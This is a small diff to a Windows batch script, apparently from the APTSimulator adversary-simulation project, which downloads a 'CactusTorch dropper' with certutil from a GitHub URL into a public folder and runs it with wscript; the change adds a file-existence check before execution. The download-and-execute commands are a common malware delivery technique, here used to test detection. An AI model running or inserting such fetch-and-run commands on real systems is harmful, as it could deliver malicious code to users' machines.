@@ -13,5 +13,4 @@ ECHO Downloading the CactusTorch dropper (press Enter if it takes more than 20s)
 cmd.exe /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/NextronSystems/APTSimulator/master/download/cactus.js C:\Users\Public\en-US.js
 
 ECHO Executing the CactusTorch dropper
-start /B cmd /c wscript.exe C:\Users\Public\en-US.js
-
+IF EXIST C:\Users\Public\en-US.js start /B cmd /c wscript.exe C:\Users\Public\en-US.js
